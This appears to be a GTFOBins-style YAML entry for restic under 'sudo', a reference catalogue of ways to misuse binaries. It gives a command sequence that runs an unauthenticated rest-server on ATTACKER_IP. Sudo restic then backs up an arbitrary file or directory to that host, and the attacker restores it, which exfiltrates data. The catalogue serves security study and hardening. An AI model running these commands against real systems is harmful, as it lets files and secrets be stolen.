---
functions:
  sudo:
    - description: Restic can be used to backup files. Run the commands in the sequence given below.
      code: |
        <!-- Attacker Machine -->
        rest-server --no-auth --listen http://ATTACKER_IP:PORT
        <!-- Victim Machine -->
        TARGET=rest_repository
        BACKUP=file_or_directory_to_backup
        sudo restic init -r rest:http://ATTACKER_IP:PORT/$TARGET
        sudo restic backup -r rest:http://ATTACKER_IP:PORT/$TARGET $BACKUP
        <!-- Attacker Machine -->
        TARGET=rest_repository
        DESTINATION=backup_to_restore
        mkdir /tmp/restic/$DESTINATION
        restic restore -r /tmp/restic/$TARGET latest --target /tmp/restic/$DESTINATION
---
